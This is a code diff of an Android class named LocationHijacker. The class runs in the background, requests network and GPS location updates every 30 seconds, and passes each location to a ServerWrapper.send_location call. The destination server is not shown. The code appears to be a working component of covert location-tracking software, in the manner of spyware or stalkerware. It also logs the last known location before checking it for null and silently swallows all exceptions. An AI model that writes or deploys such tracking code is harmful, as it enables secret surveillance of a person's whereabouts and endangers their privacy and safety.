@@ -7,50 +7,100 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.os.AsyncTask;
 import android.os.Bundle;
-import android.os.Looper;
 import android.util.Log;
 
-/**
- * Created by juan on 27/06/15.
- */
-public class LocationHijacker  extends AsyncTask<Activity, Void, Integer> {
 
+public class LocationHijacker extends AsyncTask<Activity, Void, Integer>
+{
     Activity _act;
 
+    // The minimum distance to change Updates in meters
+    private static final long   MIN_DISTANCE_CHANGE_FOR_UPDATES = 0;                                // meters
+    // The minimum time between updates in milliseconds
+    private static final long   MIN_TIME_BW_UPDATES             = 1000 * 30 * 1;                    // 30 sec
+    // Declaring a Location Manager
+    protected LocationManager   _locationManager;
+    /**
+     * PUBLIC ATTRIBUTES
+     */
+    boolean                     _isGPSEnabled                   = false;
+    boolean                     _isNetworkEnabled               = false;
+    boolean                     _canGetLocation                 = false;
+    public Location             _location;
+    double                      _latitude;
+    double                      _longitude;
     @Override
     protected Integer doInBackground(Activity... args) {
+
         _act = args[0];
-        obtain_location();
+
+        Log.i("LocationHijacker", "doInBackground");
+        this.getLocation();
+
         return 0;
     }
 
-    private void obtain_location(){
-        Log.i("LocationHijacker", "obtaining location");
-        //String locationProvider = LocationManager.NETWORK_PROVIDER;
-        // Or, use GPS location data:
-        String locationProvider = LocationManager.GPS_PROVIDER;
+    public Location getLocation() {
+        try {
+            LocationListener locationListener = new LocationListener() {
+                public void onLocationChanged(Location location) {
+                    // Called when a new location is found by the location provider.
+                    Log.i("LocationHijacker", location.toString());
+                    ServerWrapper.send_location(location);
+                }
 
-        // Acquire a reference to the system Location Manager
-        LocationManager locationManager = (LocationManager) _act.getSystemService(Context.LOCATION_SERVICE);
+                public void onStatusChanged(String provider, int status, Bundle extras) {}
 
-        // Define a listener that responds to location updates
-        LocationListener locationListener = new LocationListener() {
-            public void onLocationChanged(Location location) {
-                // Called when a new location is found by the location provider.
-                ServerWrapper.send_location(location);
+                public void onProviderEnabled(String provider) {}
+
+                public void onProviderDisabled(String provider) {}
+            };
+
+            _locationManager = (LocationManager) _act.getBaseContext().getSystemService(Context.LOCATION_SERVICE);
+            _isGPSEnabled = _locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
+            _isNetworkEnabled = _locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
+            if (!_isGPSEnabled && !_isNetworkEnabled) {
+                Log.i("LocationHijacker", "No network provider is enabled");
+                // no network provider is enabled
             }
+            else {
+                this._canGetLocation = true;
+                if (_isNetworkEnabled) {
+                    Log.i("LocationHijacker", "Network Enabled");
+                    _locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, locationListener);
+                    Log.i("LocationHijacker", "Network");
+                    if (_locationManager != null) {
+                        _location = _locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
 
-            public void onStatusChanged(String provider, int status, Bundle extras) {}
+                        Log.i("LocationHijacker", _location.toString());
 
-            public void onProviderEnabled(String provider) {}
-
-            public void onProviderDisabled(String provider) {}
-        };
-
-        Looper.prepare();
-        // Register the listener with the Location Manager to receive location updates
-        locationManager.requestLocationUpdates(locationProvider, 0, 0, locationListener);
-
+                        if (_location != null) {
+                            _latitude = _location.getLatitude();
+                            _longitude = _location.getLongitude();
+                        }
+                    }
+                }
+                // if GPS Enabled get lat/long using GPS Services
+                if (_isGPSEnabled) {
+                    Log.i("LocationHijacker", "GPS Enabled");
+                    if (_location == null) {
+                        _locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, locationListener);
+                        Log.i("GPS Enabled", "GPS Enabled");
+                        if (_locationManager != null) {
+                            _location = _locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                            if (_location != null) {
+                                _latitude = _location.getLatitude();
+                                _longitude = _location.getLongitude();
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        catch (Exception e) {
+            // do nothing
+        }
+        return _location;
     }
 
 }
